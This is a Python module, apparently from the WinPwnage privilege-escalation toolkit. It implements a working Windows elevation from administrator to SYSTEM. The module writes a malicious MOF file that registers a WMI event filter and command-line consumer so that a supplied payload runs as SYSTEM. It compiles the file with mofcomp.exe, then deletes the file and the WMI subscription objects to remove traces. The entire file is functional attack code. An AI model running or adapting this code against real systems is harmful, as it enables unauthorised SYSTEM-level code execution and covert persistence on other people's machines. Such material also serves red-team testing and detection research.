from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *
import tempfile
import time
import os

elevateMethod7_info = {
	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using mofcomp.exe (non interactive)",
	"Method": "Malicious mof file using EventFilter EventConsumer and binding that gets deleted once used",
	"Id": "7",
	"Type": "Elevation",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "elevateMethod7",
	"Function Payload": True,
}

def elevateMethod7(payload):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if payloads().exe(payload):
		mof_template = '''#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE ("\\\\\\\\.\\\\root\\\\subscription")

instance of __EventFilter as $Filt
{
	Name = "WinPwnageEventFilter";
	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'";
	QueryLanguage = "WQL";    
	EventNamespace = "root\\\\cimv2";
};

instance of CommandLineEventConsumer as $Cons
{
	Name = "WinPwnageConsumer";
	RunInteractively=false;
	CommandLineTemplate="''' + payloads().exe(payload)[1].replace(os.sep, os.sep*2) + '''";
};

instance of __FilterToConsumerBinding
{
	Filter = $Filt;
	Consumer = $Cons;
};'''
		try:
			mof_file = open(os.path.join(tempfile.gettempdir(), "elevator.mof"), "w")
			mof_file.write(mof_template)
			mof_file.close()
		except Exception:
			print_error("Cannot proceed, unable to write mof file to disk ({})".format(os.path.join(tempfile.gettempdir(), "elevator.mof")))
			return False
		else:
			print_success("Successfully wrote mof template to disk ({})".format(os.path.join(tempfile.gettempdir(), "elevator.mof")))

		time.sleep(5)

		if os.path.isfile(os.path.join(tempfile.gettempdir(), "elevator.mof")):
			exit_code = process().create("mofcomp.exe", params="{}".format(os.path.join(tempfile.gettempdir(),
											"elevator.mof")), get_exit_code=True)
			if exit_code == 0:
				print_success("Successfully compiled mof file using mofcomp")
			else:
				print_error("Unable to compile mof file containing our payload ({})".format(payloads().exe(payload)[1]))

			print_info("Waiting for (15) seconds for payload to get executed")	
			time.sleep(15)

			print_info("Performing cleaning")
			try:
				os.remove(os.path.join(tempfile.gettempdir(), "elevator.mof"))
			except Exception as error:
				print_error("Unable to remove mof file from temporary directory")
			else:
				print_success("Successfully removed mof file from temporary directory")

			cmds = [('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="WinPwnageEventFilter" DELETE'),
				('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="WinPwnageConsumer" DELETE'),
				('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="WinPwnageEventFilter"\' DELETE'),]

			for cmd in cmds:
				exit_code = process().create("wmic.exe", params="{}".format(cmd[1]), get_exit_code=True)
				if exit_code == 0:
					print_success("Successfully removed {event} (exit code: {code})".format(event=cmd[0], code=exit_code))
				else:
					print_error("Unable to removed {event} (exit code: {code})".format(event=cmd[0], code=exit_code))
		else:
			print_error("Unable to locate mof template on disk ({})".format(os.path.join(tempfile.gettempdir(), "elevator.mof")))
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False			
